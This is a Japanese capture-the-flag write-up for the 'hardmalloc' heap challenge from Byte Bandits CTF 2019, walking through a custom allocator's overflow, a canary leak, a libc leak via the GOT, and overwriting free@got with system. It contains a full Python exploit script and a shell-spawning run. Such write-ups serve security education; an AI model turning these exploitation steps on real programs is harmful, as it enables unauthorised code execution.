# [pwn ???pts] hardmalloc - Byte Bandits CTF 2019
64ビットでSSPやRELROは無効です。
```
$ checksec -f pwnable
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      Yes	0		4	pwnable
```

main関数が始まるとmmapで何かの領域を確保して初期化し、pthread_createでスレッドを生成しています。
初期化は次のような処理です。
```c
global_heap = mmap(0, global_size, 3, 0x22, -1, 0);
memset(global_heap, 0, global_size);
size_remaining = global_size;
dest = global_heap;
```

メインはヒープ系の問題っぽいサービスで、次の3つの機能があります。

- Create a block
- Print a block
- Write to a block

createではサイズを自由に指定できますが、作れるブロックは最大10個までです。
また、`size_remaining`よりも指定したサイズが小さければ作れます。
どうやら独自実装のヒープらしく、処理は次のようになっています。
```c
fd = open("/dev/urandom", 0);
read(fd, buf, 4);
close(fd);
temp = (mem_t*)malloc(0x20);
temp->addr = top;
temp->id   = *(unsigned int*)buf;
temp->size = size;
temp->x    = 0;
top += size;
size_remaining -= size;
memcpy(top, temp, 0x20);
chunk_list[num] = top;
top += 0x20;
size_remaining -= 0x20;
free(temp);
num += 1;
id_list[num] = *(unsigned int*)buf;
```

`mem_t`は次のようになっています。
```c
typedef struct {
  unsigned long size; // 0x00-0x08
  unsigned long id;   // 0x08-0x10
  char *addr;         // 0x10-0x18
  unsigned long x;    // 0x18-0x20
} mem_t;
```

したがって、ヒープ上では次のような領域が出来上がります。
```
|             |
+-------------+ <-- chunk_list[0]->addr
|             |
|  User Data  |
|             |
+------+------+ <-- chunk_list[0]
| size |  id  |
+------+------+
| addr |  x   |
+------+------+ <-- chunk_list[1]->addr
|             |
|  User Data  |
|             |
+------+------+ <-- chunk_list[1]
| size |  id  |
+------+------+
| addr |  x   |
+------+------+
|             |
```

これ自体は問題なさそう。
次にprintを見ていきます。
```c
if (index < 0 || index >= num) {
  puts("Block doesn't exist");
} else {
  ptr = chunk_list[index];
  write(1, ptr->addr, ptr->size);
  putchar(0x0A);
}
```

これも問題なさそう。
最後にwrite_to_blockを見ていきます。
ここではインデックスの他にサイズを指定できます。

```c
if (index < 0 || index >= num) {
  puts("Block doesn't exist");
} else {
  ptr = chunk_list[index];
  read(0, ptr->addr, size);
}
```

明らかにオーバーフローできますね。
しかし問題があります。
実は最初に生成していたスレッドがオーバーフローを監視しているのです。
今までidと書いてきたものは実はcanaryだったんですね。

```c
while(1) {
  for(i = 0; i < num; i++) {
    if (chunk_list[i]->canary != canary_list[i]) {
      puts("Canary corrupted. Exiting.");
      exit(1);
    }
  }
}
```

ということで、回避するためにはヒープ上に正しいcanaryを置くかチェック先のcanaryを書き換える必要があります。
canaryよりも前にsizeがあるので、ここを書き換えてprintすればcanaryが出力されるはずです。
したがって、リークされたcanaryを使ってやはりオーバーフローが可能になります。

あとはaddrをGOTのポインタに書き換えてlibc baseをリークし、さらにそのGOTのアドレスを~~one gadgetやらに書き換えればOKです。~~
本番環境では上手くいくかもしれませんが、私の環境では上手く動くone gadget rceがなかったのでfreeを使うことにしました。
create a blockするときにfreeが呼ばれるのですが、freeされるアドレス(temp)の先頭にはsizeが入っているので、サイズがASCIIで`sh`となるような領域を確保すればシェルが取れるはずです。

```python
from ptrlib import *
from time import sleep

def create_block(size):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("size:")
    sock.sendline(str(size))

def print_block(index):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("index:")
    sock.sendline(str(index))
    sock.recvline()
    return sock.recvline().rstrip()

def write_block(index, size, data):
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.recvuntil("index:")
    sock.sendline(str(index))
    sock.recvuntil("size:")
    sock.sendline(str(size))
    sleep(0.1)
    sock.send(data)

elf = ELF("./pwnable")

#libc = ELF("./libc-2.23.so")
#libc_one_gadget = 0x4526a

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
libc_one_gadget = 0x4f2c5
sock = Process("./pwnable")

# leak canary for id=0
create_block(0x20) # 0
payload = b'A' * 0x20
payload += p64(0x30) # size
write_block(0, len(payload), payload)
canary = print_block(0)[0x28:0x30]
dump(b"canary[0] = " + canary)

# leak libc base
payload = b'A' * 0x20
payload += p64(0x8) # size
payload += canary
payload += p64(elf.got("free"))
write_block(0, len(payload), payload)
addr_puts = u64(print_block(0))
libc_base = addr_puts - libc.symbol("free")
dump("libc base = " + hex(libc_base))
#addr_one_gadget = libc_base + libc_one_gadget

# write <system> to free@got
write_block(0, 8, p64(libc_base + libc.symbol("system")))

# get the shell
create_block(u16("sh"))

sock.interactive()
```

わーい、動いたー。
```
$ python solve.py
[+] Process: Successfully created new process (PID=8518)
[ptrlib] b'canary[0] = \x92\xa3\x8d\xa7\x00\x00\x00\x00'
[ptrlib] libc base = 0x7f8fd81ec000
[ptrlib]$ id

uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
```

# 感想
思ったより簡単でした。
